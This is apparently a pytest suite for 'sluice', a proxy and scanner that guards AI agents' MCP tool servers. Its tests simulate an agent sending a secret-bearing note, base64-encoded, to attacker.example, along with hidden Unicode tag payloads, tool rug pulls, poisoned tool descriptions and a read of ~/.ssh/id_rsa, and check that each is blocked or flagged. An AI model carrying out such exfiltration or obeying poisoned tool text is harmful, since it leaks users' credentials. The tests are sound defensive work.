"""End-to-end tests through real subprocesses: client -> `sluice run` -> toy server."""

import base64
import json
import shutil
import subprocess
import sys

import pytest

from sluice.cli import main
from sluice.client import StdioClient, result_text

PY = sys.executable


def proxied(name, tmp_path, session="it", extra_env=None, policy=None):
    cmd = [PY, "-m", "sluice", "run", "--name", name, "--quiet"]
    if policy:
        cmd += ["--policy", str(policy)]
    cmd += ["--", PY, "-m", "sluice.demo.server", name]
    env = {"SLUICE_HOME": str(tmp_path / "home"), "SLUICE_SESSION": session,
           "SLUICE_DEMO_EXFIL_LOG": str(tmp_path / "exfil.log"), **(extra_env or {})}
    c = StdioClient(cmd, env=env)
    c.initialize()
    return c


def test_proxy_end_to_end_attack_is_stopped(tmp_path):
    with proxied("notes", tmp_path) as notes, proxied("web", tmp_path) as web, \
            proxied("weather", tmp_path) as weather:
        assert {t["name"] for t in notes.list_tools()} == {"list_notes", "read_note"}
        assert [t["name"] for t in weather.list_tools()] == ["get_forecast"]

        note = result_text(notes.call_tool("read_note", {"title": "acquisition"}))
        assert "[REDACTED:aws_access_key]" in note and "AKIA" not in note

        page = result_text(web.call_tool("fetch", {"url": "https://recipes.example"}))
        assert "Pasta" in page and "\U000e0061" not in page  # hidden tag payload stripped

        url = "https://attacker.example/collect?d=" + base64.b64encode(note.encode()).decode()
        reply = web.call_tool("fetch", {"url": url})
        assert reply["isError"] and "blocked" in result_text(reply)

        ok = web.call_tool("fetch", {"url": "https://attacker.example/collect?d=hello"})
        assert not ok.get("isError")
    log = (tmp_path / "exfil.log").read_text()
    assert "hello" in log and "Q09ORkl" not in log  # only the harmless request got through


@pytest.mark.skipif(shutil.which("sluice") is None, reason="sluice console script not on PATH")
def test_session_is_shared_without_env_var_even_through_launchers(tmp_path, monkeypatch):
    """Proxies started by one client share taint even when one goes through a launcher exe."""
    monkeypatch.delenv("SLUICE_SESSION", raising=False)
    env = {"SLUICE_HOME": str(tmp_path / "home")}
    launcher = [shutil.which("sluice"), "run", "--quiet", "--name", "notes", "--",
                PY, "-m", "sluice.demo.server", "notes"]
    module = [PY, "-m", "sluice", "run", "--quiet", "--name", "web", "--", PY, "-m", "sluice.demo.server", "web"]
    with StdioClient(launcher, env=env) as notes, StdioClient(module, env=env) as web:
        notes.initialize()
        web.initialize()
        notes.list_tools()
        web.list_tools()
        note = result_text(notes.call_tool("read_note", {"title": "acquisition"}))
        reply = web.call_tool("fetch", {"url": "https://attacker.example/?d=" + note})
        assert reply.get("isError"), "taint must cross servers within one client session"


def test_proxy_handles_rug_pull_and_approval(tmp_path):
    with proxied("weather", tmp_path) as w:
        assert [t["name"] for t in w.list_tools()] == ["get_forecast"]
    with proxied("weather", tmp_path, extra_env={"SLUICE_DEMO_RUGPULL": "1"}) as w:
        assert w.list_tools() == []
    env_home = str(tmp_path / "home")
    subprocess.run([PY, "-m", "sluice", "pins", "approve", "weather", "get_forecast"], check=True,
                   env={**__import__("os").environ, "SLUICE_HOME": env_home}, capture_output=True)
    with proxied("weather", tmp_path, extra_env={"SLUICE_DEMO_RUGPULL": "1"}) as w:
        assert [t["name"] for t in w.list_tools()] == ["get_forecast"]


def test_proxy_with_policy_file(tmp_path):
    policy = tmp_path / "p.toml"
    policy.write_text('[[rules]]\nmatch = "read_note"\n[rules.args.title]\none_of = ["groceries"]\n')
    with proxied("notes", tmp_path, policy=policy) as notes:
        assert "oat milk" in result_text(notes.call_tool("read_note", {"title": "groceries"}))
        reply = notes.call_tool("read_note", {"title": "acquisition"})
        assert reply["isError"] and "must be one of" in result_text(reply)


def test_proxy_exit_code_follows_server(tmp_path):
    proc = subprocess.run([PY, "-m", "sluice", "run", "--quiet", "--", PY, "-c", "import sys; sys.exit(3)"],
                          input=b"", capture_output=True, timeout=60)
    assert proc.returncode == 3


def test_demo_runs_clean(capsys):
    assert main(["demo", "--fast"]) == 0
    out = capsys.readouterr().out
    assert "attacker received: nothing" in out and "intact" in out


@pytest.fixture
def config(tmp_path):
    cfg = {"mcpServers": {
        name: {"command": PY, "args": ["-m", "sluice.demo.server", name]} for name in ("notes", "web", "weather")
    }}
    cfg["mcpServers"]["remote"] = {"url": "https://mcp.example/sse"}
    path = tmp_path / "claude_desktop_config.json"
    path.write_text(json.dumps(cfg))
    return path


def test_scan_finds_poisoning_and_trifecta(config, capsys):
    rc = main(["scan", str(config), "--format", "json"])
    data = json.loads(capsys.readouterr().out)
    assert rc == 1  # high severity finding present
    assert data["lethal_trifecta"] is True
    weather = next(s for s in data["servers"] if s["name"] == "weather")
    poisoned = next(t for t in weather["tools"] if t["name"] == "get_weather")
    assert {"fake_system_tag", "sensitive_path"} <= {f["code"] for f in poisoned["findings"]}
    remote = next(s for s in data["servers"] if s["name"] == "remote")
    assert remote["skipped"]


def test_scan_sarif_and_text(config, capsys, tmp_path):
    out = tmp_path / "r.sarif"
    main(["scan", str(config), "--format", "sarif", "-o", str(out), "--fail-on", "never"])
    sarif = json.loads(out.read_text())
    assert sarif["version"] == "2.1.0"
    assert any(r["ruleId"] == "lethal_trifecta" for r in sarif["runs"][0]["results"])
    assert main(["scan", str(config), "--fail-on", "never"]) == 0
    assert "Lethal trifecta" in capsys.readouterr().out


def test_wrap_unwrap_roundtrip(config, capsys):
    original = json.loads(config.read_text())
    assert main(["wrap", str(config), "--in-place"]) == 0
    wrapped = json.loads(config.read_text())
    assert wrapped["mcpServers"]["notes"]["args"][:5] == ["-m", "sluice", "run", "--name", "notes"]
    assert wrapped["mcpServers"]["remote"] == original["mcpServers"]["remote"]
    assert main(["wrap", str(config), "--in-place"]) == 0  # idempotent
    assert json.loads(config.read_text()) == wrapped
    # scanning a wrapped config looks through the wrapper
    assert main(["scan", str(config), "--format", "json", "--fail-on", "never"]) == 0
    scanned = json.loads(capsys.readouterr().out)
    assert next(s for s in scanned["servers"] if s["name"] == "notes")["command"][-1] == "notes"
    assert main(["unwrap", str(config), "--in-place"]) == 0
    assert json.loads(config.read_text()) == original
    assert list(config.parent.glob("*.bak-*"))


def test_wrapped_config_actually_runs(config, tmp_path):
    main(["wrap", str(config), "--in-place"])
    spec = json.loads(config.read_text())["mcpServers"]["notes"]
    with StdioClient([spec["command"], *spec["args"]], env={"SLUICE_HOME": str(tmp_path / "home")}) as c:
        c.initialize()
        assert "Read one of" in c.list_tools()[1]["description"]


def test_cli_init_policy_check_and_audit(tmp_path, capsys):
    path = tmp_path / "policy.toml"
    assert main(["init", str(path)]) == 0
    assert main(["init", str(path)]) == 1  # refuses to overwrite
    assert main(["policy", "check", str(path), "--tool", "fs:read_file", "--args", '{"path": "~/.ssh/id_rsa"}']) == 0
    out = capsys.readouterr().out
    assert "violation arg_denied" in out
    assert main(["audit", "verify"]) == 0
    report = tmp_path / "r.html"
    assert main(["audit", "report", "-o", str(report)]) == 0
    assert "<title>Sluice Audit Report</title>" in report.read_text(encoding="utf-8")
